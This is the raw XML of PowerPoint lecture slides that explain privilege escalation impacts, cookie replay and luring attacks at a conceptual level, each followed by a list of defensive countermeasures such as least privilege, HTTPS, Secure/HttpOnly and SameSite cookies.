                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2D1A805-1AF8-CB73-A5AB-40F9E7B71633}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Tamper with logs, and modify system/security policies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Read/alter sensitive records, secrets, and IP.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Install </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0" err="1"/>
              <a:t>autostarts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>, kernel/drivers, or cloud backdoors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Domain escalation, service-to-service hopping, cloud account pivoting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Outages, extortion, compliance violations, reputational damage, and regulatory penalties.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="252496337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108E5-1E96-75F5-6075-CA0A642533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5E778A-DAF9-1A97-E1B1-C4D05471E602}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1FB7F184-9959-29BF-B80B-0EDE7FA829B7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Apply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>principle of least privilege</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Regularly review </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>access rights</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Patch known privilege escalation vulnerabilities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>role-based access control.</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Employ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>logging &amp; monitoring</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> for abnormal privilege changes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Enforce </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>segregation of duties</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>·  Conduct </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>penetration testing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> for privilege escalation flaws.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="107361290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899C8-7A33-16C5-D14D-6C2A2013C4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D8FE75-C22A-8E77-F466-F76B7EBFD3BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Cookie Replay</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90D676B7-541B-3AAB-8E94-EFBB451EFE21}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="528271" y="758603"/>
            <a:ext cx="7704000" cy="4238225"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The Cookie:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> In web applications, a session cookie is a token that acts as a "proof of login." After you successfully log in, the server gives your browser this cookie. Your browser automatically sends it back with every subsequent request to that website to identify you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The Intercept (Theft):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> An attacker steals this session cookie. This can happen through:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Network Sniffing:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Intercepting unencrypted HTTP traffic (mitigated by using HTTPS).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Injecting malicious scripts into a website that send the user's cookies to the attacker.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Man-in-the-Middle (MitM) Attacks:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Intercepting communication between the user and the server.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Malware on the User's Machine:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Stealing cookies directly from the browser's storage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>The Replay:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> The attacker does not need to know the user's password. They simply take the stolen cookie and place it in their own browser's requests to the website. The server sees the valid cookie and grants the attacker the same access as the original user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="351405986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F4764-3276-D5F9-BA20-CBF8AAF26DCA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>A successful attack follows a simple pattern:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{37D82127-72A6-C3D0-0077-CF97354A4AB4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Capture (Theft):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> The attacker acquires the victim's session cookie. This is the crucial first step and can be achieved through various methods, which define the "types" of replay attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Replay (Impersonation):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> The attacker injects the stolen cookie into their own browser's requests to the target website.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Access (Exploitation):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> The web server receives the request, validates the cookie, and because it appears valid, grants the attacker access to the victim's session. The attacker can now perform any action the victim is authorized to do.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="336121605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50D03-3C61-28F0-C3C0-87533DE9C337}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Types of Cookie Replay Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{705E7384-293A-B730-21FA-12FEF2D3A4AA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Network-Based Interception</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Man-in-the-Middle (MitM) Attacks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Sniffing on Unencrypted Networks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Client-Side Capture</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Cross-Site Scripting (XSS)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Malware on the User's Device</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Physical Access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>Server-Side Leakage</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Logs, Analytics, and Referrer Headers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="286101704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F08AB-90A2-1BCC-8EEE-B465FEF509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7C55DB-D0A9-FC26-033C-513A91EE46A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8AB58A72-1D97-5CCD-511E-5F983D1B7F42}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Always use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>HTTPS/TLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> to protect cookies in transit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Mark cookies as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Secure &amp; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>SameSite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> attribute to prevent cross-site use.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Implement </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>short session timeouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Require </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>reauthentication</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t> for sensitive operations.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Bind cookies to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>IP/device fingerprints</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>Monitor for suspicious session reuse.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="173676755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8E86F-02FD-1007-4DC1-A8346315DD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389C52-B128-EF1F-0F34-F5C9BA496AA7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Luring Attack</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4544E9C3-5F71-67C1-521A-C60F2D13DA8C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Attacker tricks user into visiting malicious sites or executing actions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Often disguised as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>free downloads, fake ads, or offers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Relies heavily on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>social engineering</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>May deliver malware or request login credentials.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Example: watering-hole attacks (infected popular sites).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Can be combined with phishing emails.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Targets </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>curiosity and trust</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> of users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" lvl="0" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>Very effective against inexperienced users.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="482600" indent="-342900">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:endParaRPr lang="en-IN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="96423580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B2F2C-F0D8-5DCC-A05E-AB238324F4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725955-1DDF-16D1-5655-9A956A40EA2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Countermeasures</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5FA6B08-F840-CE1F-3138-61E65E96039E}"/>
              </a:ext>
            </a:extLst>
